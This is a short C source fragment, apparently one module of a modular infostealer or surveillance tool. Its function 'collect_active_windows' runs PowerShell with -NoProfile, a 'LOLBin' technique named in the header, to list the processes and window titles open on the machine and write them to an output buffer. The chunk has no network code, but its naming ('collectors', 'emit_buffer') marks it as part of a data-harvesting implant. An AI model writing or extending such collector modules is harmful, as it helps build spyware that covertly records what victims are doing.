// chunk: collectors/active_windows_lolbin
// depends: core/emit_buffer, core/run_cmd
// provides: collect_active_windows
// note: LOLBin active windows via powershell Get-Process

#ifndef CHUNK_ACTIVE_WINDOWS_LOLBIN
#define CHUNK_ACTIVE_WINDOWS_LOLBIN

static void collect_active_windows(void) {
    emitf("=== ACTIVE WINDOWS ===\r\n");
    char buf[8192] = {0};
    DWORD buf_len = 0;
    run_cmd("powershell -NoProfile -Command \"Get-Process | Where-Object {$_.MainWindowTitle} | Select-Object ProcessName,MainWindowTitle | Format-Table -AutoSize\"",
            buf, sizeof(buf), &buf_len);
    if (buf_len > 0) emitf("%.*s", (int)buf_len, buf);
    emitf("\r\n");
}

#endif
